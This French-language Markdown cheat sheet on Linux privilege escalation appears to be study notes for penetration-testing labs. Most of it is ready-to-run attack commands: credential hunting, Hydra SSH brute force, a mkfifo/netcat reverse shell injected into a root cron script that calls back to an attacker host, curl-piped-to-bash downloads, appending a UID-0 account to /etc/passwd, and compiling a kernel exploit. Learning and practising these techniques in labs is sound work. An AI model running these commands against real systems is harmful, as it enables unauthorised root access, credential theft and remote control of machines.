# Linux

## Commandes utiles

**Trouver un flag**

```bash
find / -name "flag.txt" 2>/dev/null
```

**Transfert de fichiers avec nc**

```bash
# On your receiver:
nc -l -p 4444 -q 1 > something.zip < /dev/null

# On your sender:
cat something.zip | netcat <IP> 4444
```

**Télécharger un fichier depuis HTTP**
```bash
wget http://<ip>/script.exe
curl -O http://<ip>/script.exe
```

**Exécuter un script Bash**

```bash
cat script.sh | bash
curl http://<IP>/script.sh | bash
```

**Extraire le contenu lisible d'un binaire**

```bash
strings /usr/bin/passwd_flag
```

## Enumération

### Enumération manuelle

**Utilisateur courant**

```bash
id
```

**Tous les utilisateurs**

```bash
cat /etc/passwd
```

Format : `login:x:UID:GID:commentaire:home:shell`. Le `x` signifie que le hash est dans `/etc/shadow`. Les comptes de service ont `/usr/sbin/nologin` comme shell.

**Hostname**

```bash
hostname
```

**Version OS et kernel**

```bash
cat /etc/issue
cat /etc/os-release
uname -a
```

**Processus en cours d'exécution**

```bash
ps aux
```

Chercher aussi les fichiers générés par `iptables-save` :

```bash
grep -r "iptables" /etc/ 2>/dev/null
```

**Tâches planifiées (cron)**

```bash
ls -lah /etc/cron*
crontab -l
sudo crontab -l
```

**Applications installées**

```bash
# Debian/Ubuntu
dpkg -l

# Red Hat/CentOS
rpm -qa
```

**Répertoires accessibles en écriture**

```bash
find / -writable -type d 2>/dev/null
```

**Fichiers accessibles en écriture**

```bash
find / -writable -not -path "/proc/*" 2>/dev/null
```

**Trouver des fichiers avec permissions spéciales**

```bash
# regarder les binaires liés à un group
find / -group <GROUP> 2>/dev/null

# infos sur un fichier (looking for setuid, suid)
ls -la <FILE_PATH> && file <FILE_PATH>
```

**Systèmes de fichiers montés et partitions**

```bash
cat /etc/fstab
mount
lsblk
```

**Modules kernel chargés**

```bash
lsmod
/sbin/modinfo <module>
```
### Enumération automatique

**linPEAS**

https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS

```bash
# Kali : servir
cp /usr/share/peass/linpeas/linpeas.sh .
python3 -m http.server 80
```

```bash
# Cible : télécharger et exécuter
curl http://<ip>/linpeas.sh | bash
# ou
wget http://<ip>/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh
./linpeas.sh > output.txt
```

**unix-privesc-check**

Pré-installé sur Kali dans `/usr/bin/unix-privesc-check`. Transférer sur la cible et rediriger l'output dans un fichier.

```bash
# Standard : rapide, peu de faux positifs
./unix-privesc-check standard > output.txt

# Detailed : vérifie aussi les file handles ouverts et les fichiers appelés par les scripts
./unix-privesc-check detailed > output.txt
```

Chercher les lignes `WARNING` dans l'output - elles indiquent des misconfigurations exploitables (ex: `/etc/passwd` world-writable).

## Exposed confidential information

### Inspecting user trails

**Variables d'environnement**

Parfois des credentials sont stockés dans des variables d'environnement (ex: scripts d'authentification custom).

```bash
env
```

**Fichiers de configuration shell**

Vérifier si une variable suspecte trouvée dans `env` est persistante (définie dans `.bashrc`, `.bash_profile`, etc.).

```bash
cat ~/.bashrc
cat ~/.bash_profile
cat ~/.profile
```

**Escalade directe si credential trouvé**

```bash
su - root
# ou
su - <autre_user>
```

**Générer un wordlist dérivé d'un credential connu**

Si on connaît un pattern (ex: `Lab` + 3 chiffres) :

```bash
# Kali
crunch 6 6 -t Lab%%% > wordlist
```

**Brute force SSH avec Hydra**

```bash
# Kali
hydra -l <user> -P wordlist <ip> -t 4 ssh
```

**Vérifier les droits sudo une fois connecté**

```bash
sudo -l
sudo -i
```

### Inspecting service footprints

**Surveiller les processus en temps réel pour détecter des credentials**

Contrairement à Windows, on peut inspecter les processus des autres utilisateurs, y compris root.

```bash
watch -n 1 "ps -aux | grep pass"
```

**Sniffer le trafic loopback avec tcpdump**

Nécessite sudo ou les droits explicites sur tcpdump. Utile si des services internes échangent des credentials en clair sur localhost.

```bash
sudo tcpdump -i lo -A | grep "pass"
```

## Insecure file permissions

### Abusing cron jobs

**Lister les jobs cron**

```bash
ls -lah /etc/cron*

crontab -l

sudo crontab -l

cat /etc/crontab; ls -la /etc/cron.*/ ; crontab -l 2>/dev/null
```

**Identifier les cron jobs root dans les logs**

```bash
grep "CRON" /var/log/syslog
```

**Vérifier le contenu et les permissions du script**

```bash
cat /home/joe/.scripts/user_backups.sh
ls -lah /home/joe/.scripts/user_backups.sh
```

Si le script est world-writable (`-rwxrwxrw-`) et exécuté par root, on peut y injecter un reverse shell.

**Injecter un reverse shell**

```bash
echo >> user_backups.sh
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <kali-ip> 4444 >/tmp/f" >> user_backups.sh
```

**Listener sur Kali**

```bash
nc -lnvp 4444
```

### Abusing password authentication

Si `/etc/passwd` est world-writable, on peut y ajouter un compte root arbitraire - le hash dans la deuxième colonne prend la priorité sur `/etc/shadow`.

**Vérifier que /etc/passwd est writable**

```bash
ls -lah /etc/passwd
```

**Générer un hash de mot de passe**

```bash
openssl passwd w00t
# → Fdzt.eqJQ4s0g
```

**Ajouter un superuser**

```bash
echo "root2:<hash>:0:0:root:/root:/bin/bash" >> /etc/passwd
```

UID/GID à 0 = compte root.

**Se connecter avec le nouveau compte**

```bash
su root2
id
```


## Insecure system components

### Abusing SUID binaries 

Si le SUID est positionné sur un binaire appartenant à root, n'importe quel utilisateur peut l'exécuter avec les droits root.

**Trouver les binaires avec le bit SUID**

```bash
find / -perm -u=s -type f 2>/dev/null
find / -perm /4000 2>/dev/null

# Inspecter les UIDs d'un processus (real / effective)
ps aux | grep passwd
grep Uid /proc/<pid>/status
```

Pour l'exploitation des binaires SUID, chercher le binaire sur [GTFOBins](https://gtfobins.github.io/) → onglet **SUID**.
Référence pour l'exploitation : [GTFOBins](https://gtfobins.github.io/), [g0tmi1k](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/), [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md), [HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation).
### Abusing binaries capabilities

**Lister les capabilities des binaires**

```bash
/usr/sbin/getcap -r / 2>/dev/null
```

Les binaires avec `cap_setuid+ep` permettent d'usurper l'identité de root. Chercher le binaire sur [GTFOBins](https://gtfobins.github.io/) → onglet **Capabilities**.

### Abusing sudo

**Lister les commandes autorisées en sudo**

```bash
sudo -l
```

Chercher chaque binaire autorisé sur [GTFOBins](https://gtfobins.github.io/) → onglet **Sudo**.

**Vérifier si AppArmor bloque l'exploitation**

Si une tentative échoue avec "Permission denied", vérifier les logs et le statut AppArmor.

```bash
cat /var/log/syslog | grep <binaire>
# En tant que root :
aa-status
```

### Exploiting kernel vulnerabilities

**Identifier la version du kernel et l'architecture**

```bash
cat /etc/issue
uname -r
arch
```

**Chercher un exploit avec searchsploit**

```bash
searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation" | grep "4." | grep -v " < 4.4.0" | grep -v "4.8"
```

**Copier et inspecter l'exploit**

```bash
cp /usr/share/exploitdb/exploits/linux/local/45010.c .
head 45010.c -n 20
```

Les premières lignes contiennent en général les instructions de compilation.

**Transférer le code source sur la cible et compiler**

```bash
# Kali
scp cve-2017-16995.c <user>@<ip>:

# Cible
gcc cve-2017-16995.c -o cve-2017-16995
file cve-2017-16995
./cve-2017-16995
```

Compiler sur la cible évite les problèmes de cross-compilation (bibliothèques, architecture).
